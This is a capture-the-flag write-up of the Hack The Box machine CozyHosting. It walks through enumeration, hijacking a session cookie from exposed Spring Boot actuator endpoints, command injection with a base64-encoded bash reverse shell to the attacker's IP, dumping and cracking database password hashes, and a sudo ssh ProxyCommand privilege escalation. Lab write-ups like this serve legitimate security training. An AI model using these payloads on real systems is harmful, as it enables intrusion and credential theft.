---
title: Hack the box - CozyHosting pwned!
date: 2024-02-17 00:00:01 +0000
categories: [hack the box, machine]
tags: [hack the box, machine, cozyhosting, spring boot, postgres, sudo proxycommand]
img_path: /assets/img/posts/
---

## Machine info

![CozyHosting](htb-cozyhosting-info.png)
*CozyHosting info*

## Annotations

>In this article we are going to assume the following ip addresses:
>
>Local machine (attacker, local host): 10.10.16.96
>
>Target machine (victim, CozyHosting): 10.10.11.230
{: .prompt-info}

## Enumeration

Let's go look for the open ports in the machine using `nmap`:

`sudo nmap -Pn -n -sS -p- -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.230`

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4646/tcp open  dots-signal
4848/tcp open  appserv-http
8083/tcp open  us-srv
```

## Footprinting

We fine tune the scan to see if we can get more information about the running services:

`sudo nmap -Pn -n -sVC -p22,80,4646,4848,8083 -oN nmap_initial_versions.txt 10.10.11.230`

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
80/tcp   open  http          nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
4646/tcp open  dots-signal?
4848/tcp open  appserv-http?
8083/tcp open  us-srv?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see that there is a web service running on port 80 pointing to `http://cozyhosting.htb`, so let's start there.
First of all, we add the machine address to our `/etc/hosts`:

`echo "http://cozyhosting.htb" | sudo tee -a /etc/hosts`

We browse to `http://cozyhosting.htb` to investigate the web:

![CozyHosting](htb-cozyhosting-web.png)
*CozyHosting web*

Using `wappalyzer` we can see that is programmed in java:

![CozyHosting](htb-cozyhosting-web-wappalyzer.png)
*CozyHosting web wappalyzer*

We can't do anything in the web, so we will fuzzing with `gobuster` to find hidden resources:

`gobuster dir -u http://cozyhosting.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 403,404,301`

```
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET               
[+] Threads:                 10                
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404,301       
[+] User Agent:              gobuster/3.6      
[+] Timeout:                 10s               
===============================================================
Starting gobuster in directory enumeration mode                                                         
===============================================================
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/admin                (Status: 401) [Size: 97]                                                          
/logout               (Status: 204) [Size: 0]
/error                (Status: 500) [Size: 73]
```

`/admin` is very interesting, but, if we look at `/error`, we can see that the "white label error" is a `spring boot` error:

![CozyHosting](htb-cozyhosting-web-white-label-error.png)
*CozyHosting white label error*

So let's fuzz with a `spring boot` dictionary:

`gobuster dir -u http://cozyhosting.htb -w /opt/SecLists/Discovery/Web-Content/spring-boot.txt`

```
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/spring-boot.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/actuator             (Status: 200) [Size: 634]
/actuator/env/lang    (Status: 200) [Size: 487]
/actuator/env         (Status: 200) [Size: 4957]
/actuator/env/home    (Status: 200) [Size: 487]
/actuator/beans       (Status: 200) [Size: 127224]
/actuator/env/path    (Status: 200) [Size: 487]
/actuator/health      (Status: 200) [Size: 15]
/actuator/mappings    (Status: 200) [Size: 9938]
/actuator/sessions    (Status: 200) [Size: 48]
```

## Foothold

### kanderson

If we look in `/actuator/sessions` we can find the cookie for the user `kanderson`:

![CozyHosting](htb-cozyhosting-web-actuator-sessions.png)
*CozyHosting web actuator sessions*

As `kanderson` is the only user that we have, let's try if it has admin privileges in the web.
We put our `burp suite` intercepting in proxy mode, and we edit the cookie values for the petitions to impersonate kanderson:

![CozyHosting](htb-cozyhosting-web-burp-impersonating-kanderson.png)
*Impersonating kanderson with burp suite*

Ok, now as `kanderson` we can connect to a host using ssh intruducing the host and the username.
Unafortunately we don't have any, so we will get an error:

![CozyHosting](htb-cozyhosting-web-admin-panel-ssh-error.png)
*Cozyhosting admin panel ssh error*

If we look closely the error we can see that it's a bash error, so the error could be generated directly on the machine and not in the web:

![CozyHosting](htb-cozyhosting-web-admin-panel-ssh-error-detail.png)
*Cozyhosting admin panel ssh error detail*

We take a closer look at the petition to the request made using `burp suite` and we can see that `/bin/bash` it's being called:

![CozyHosting](htb-cozyhosting-web-admin-panel-ssh-error-burp.png)
*Cozyhosting admin panel ssh error in burp*

### Reverse shell

As it seems that the parameters are sent without sanitization to the system, we will try to inject here a reverse bash shell using `burp suite`.
We start listening in our machine:

`nc -lvnp 1234`

Now, we generate our shell.
As the only input sanitization is that the username can't contain spaces, we will encode it in base64.

```
echo "bash -i >& /dev/tcp/10.10.16.96/1234 0>&1" | base64 -w 0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK
```

As we need to our shell will be executed as 
`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK|base64 -d|bash` in the target, and we can't use whitespaces, we will take advantage of [Input Field Separators (IFS)](https://en.wikipedia.org/wiki/Input_Field_Separators).
We are going to replace the whitespaces with `${IFS}`:

`echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK|base64${IFS}-d|bash`

Our payload for the `username` parameter will be: 

`user;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK|base64${IFS}-d|bash`

As our payload contains special characters, we will url-encode it using `burp suite`: Select text -> right click -> Convert selection -> URL -> URL-encode key characters (CTRL+U):

![CozyHosting](htb-cozyhosting-web-admin-panel-ssh-payload.png)
*Cozyhosting admin panel ssh payload*

We send it and... We have our shell!

### app

Fist of all, as always, it's upgrading our tty:

```
script /dev/null -c bash
ctrl+z
stty raw -echo;fg
reset xterm
export TERM=xterm-256color
stty rows 56 columns 209
```

We take a look at a new user:

```
app@cozyhosting:/app$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```

We look at what files the app user has:

```
app@cozyhosting:/app$ ls -lA
cloudhosting-0.0.1.jar
```

And we look for other uses in the system:

```
app@cozyhosting:/app$ ls -lA /home
drwxr-x--- 3 josh josh 4096 Aug  8  2023 josh
```

We download the file, as we don't have permissions to run `netcat` we will start a python web server:

`app@cozyhosting:/app$ python3 -m http.server 12345`

And we download the file in our host using `wget`:

`wget 10.10.11.230:12345/cloudhosting-0.0.1.jar`

We extract the `cloudhosting-0.0.1.jar` file in our host and we take a look at the files content.
After a while, we will find interesting information in `BOOT-INF/classes/application.properties`:

```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

We have a `postgres` database in the localhost, an user and a password, so let's investigate!

`app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres`

We list the databases:

```
postgres=# \l
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
```

We select `cozyhosting` and we list the tables:

```
postgres=# \c cozyhosting

cozyhosting=# \dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)
```

We take a look at the users data:

```
cozyhosting=# select * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

Now, we have two hashes. 
As we was `kanderson` before, we will crack the `admin` hash.
We add the admin hash to the `admin_hash.txt` file, and we crack it using `hashcat`:

`echo $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm > admin_hash.txt`

`hashcat -a 0 -m 3200 admin_hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`

### josh

Ok, now we have a password and two possible users: `admin` and `josh`.
So we will try them to connect using `ssh`.
As `admin` does not work, let's try `josh`:


`ssh josh@10.10.11.230`

We are in!

Let's take a look at our new user's info and see what he can do:

```
josh@cozyhosting:~$ id
uid=1003(josh) gid=1003(josh) groups=1003(josh)
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

## Privilege escalation

As we can see in [GTFOBins](https://gtfobins.github.io) we can [exploit ssh](https://gtfobins.github.io/gtfobins/ssh):

`josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`

And, now, we can get our system flag!

## Pwned!

![CozyHosting](htb-cozyhosting-pwned.png)
*CozyHosting has been Pwned*

*Enjoy! ;)*
